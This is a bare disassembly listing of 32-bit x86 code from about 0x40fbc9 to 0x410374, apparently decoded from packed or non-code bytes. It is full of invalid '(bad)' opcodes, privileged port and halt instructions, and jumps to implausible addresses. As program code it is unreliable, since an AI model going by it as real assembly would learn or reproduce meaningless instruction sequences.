  40fbc9:	out    dx,eax
  40fbca:	(bad)  
  40fbcb:	neg    eax
  40fbcd:	ins    DWORD PTR es:[edi],dx
  40fbce:	test   esi,edi
  40fbd0:	clc    
  40fbd1:	pop    esp
  40fbd2:	inc    ebp
  40fbd3:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fbd9:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fbdf:	add    cl,al
  40fbe1:	jne    0x40fb7e
  40fbe3:	mov    esi,DWORD PTR [edx]
  40fbe5:	in     al,dx
  40fbe6:	push   esi
  40fbe7:	xor    BYTE PTR [ebp-0xe],dh
  40fbea:	add    edi,esi
  40fbec:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fbf2:	add    cl,bh
  40fbf4:	mov    edi,DWORD PTR [ebp+0x8]
  40fbf7:	mov    DWORD PTR [ebp-0x14],esi
  40fbfa:	add    esi,DWORD PTR [ebp+0x3c]
  40fbfd:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fc03:	mov    ah,0x3e
  40fc05:	fwait
  40fc06:	pushf  
  40fc07:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fc0d:	jne    0x40fb9a
  40fc0f:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fc12:	icebp  
  40fc13:	icebp  
  40fc14:	shl    edx,0xf2
  40fc17:	(bad)  
  40fc18:	mov    ah,0x16
  40fc1a:	push   eax
  40fc1b:	jne    0x40fbb0
  40fc1d:	mov    ecx,DWORD PTR [edi]
  40fc1f:	in     al,dx
  40fc20:	jmp    0x40fc13
  40fc22:	add    dl,dh
  40fc24:	mov    edi,esi
  40fc26:	or     al,0x8
  40fc28:	inc    ebp
  40fc29:	jne    0x40fc2e
  40fc2b:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fc31:	ret    
  40fc32:	or     bh,bh
  40fc34:	jge    0x40fc1e
  40fc36:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fc3c:	xor    edi,eax
  40fc3e:	add    esi,DWORD PTR [ebp-0x77]
  40fc41:	mov    ebx,esp
  40fc43:	clc    
  40fc44:	neg    DWORD PTR [ebp-0x7c]
  40fc47:	xor    eax,DWORD PTR [eax]
  40fc49:	cmp    eax,DWORD PTR [eax]
  40fc4b:	repz jne 0x40fbe3
  40fc4e:	xor    eax,DWORD PTR [ecx]
  40fc50:	add    ebx,DWORD PTR [eax]
  40fc52:	mov    DWORD PTR [ebp-0x8],eax
  40fc55:	mov    eax,edi
  40fc57:	cld    
  40fc58:	lock pop eax
  40fc5a:	test   DWORD PTR [ebx],esi
  40fc5c:	clc    
  40fc5d:	add    edx,DWORD PTR [edi-0x740bff77]
  40fc63:	fdivp  st(4),st
  40fc65:	test   ecx,esi
  40fc67:	(bad)  
  40fc68:	jnp    0x40fc69
  40fc6a:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fc70:	jae    0x40fbfd
  40fc72:	sub    edi,esp
  40fc74:	(bad)  
  40fc75:	shl    DWORD PTR [eax-0x3e],0x89
  40fc79:	leave  
  40fc7a:	call   0x8196b387
  40fc7f:	in     al,dx
  40fc80:	(bad)  
  40fc81:	in     al,dx
  40fc82:	add    bh,al
  40fc84:	mov    esp,edi
  40fc86:	in     al,dx
  40fc87:	test   DWORD PTR [ebp-0x8],edi
  40fc8a:	mov    eax,DWORD PTR [ebp+0x2b]
  40fc8d:	xor    al,BYTE PTR [ebx]
  40fc8f:	pushf  
  40fc90:	jnp    0x572ff8c9
  40fc96:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  40fc9a:	loopne 0x40fccf
  40fc9c:	jne    0x40fc59
  40fc9e:	mov    esi,DWORD PTR [edx-0x20]
  40fca1:	add    BYTE PTR [ebp-0x3d],bh
  40fca4:	xor    eax,DWORD PTR [ebp-0x73]
  40fca7:	mov    edi,DWORD PTR [esi]
  40fca9:	cld    
  40fcaa:	jb     0x40fc72
  40fcac:	add    bl,al
  40fcae:	jne    0x40fcf5
  40fcb0:	mov    edx,DWORD PTR [edi-0x10]
  40fcb3:	jge    0x40fd32
  40fcb5:	mov    esi,DWORD PTR [ebx]
  40fcb7:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fcbb:	xor    esi,DWORD PTR [ebp-0x77]
  40fcbe:	mov    esi,eax
  40fcc0:	lock inc ebp
  40fcc2:	jge    0x40fcf5
  40fcc4:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fccb:	dec    ebp
  40fccc:	mov    esi,DWORD PTR [ebx]
  40fcce:	loopne 0x40fc59
  40fcd0:	jge    0x40fcca
  40fcd2:	add    DWORD PTR [ebp-0x7d],eax
  40fcd5:	icebp  
  40fcd6:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fcdd:	dec    ebp
  40fcde:	hlt    
  40fcdf:	xor    ebx,DWORD PTR [ebp-0x77]
  40fce2:	mov    esi,esp
  40fce4:	in     al,0x45
  40fce6:	jge    0x40fd25
  40fce8:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fcef:	dec    ebp
  40fcf0:	push   esp
  40fcf1:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  40fcf7:	inc    ebp
  40fcf8:	hlt    
  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
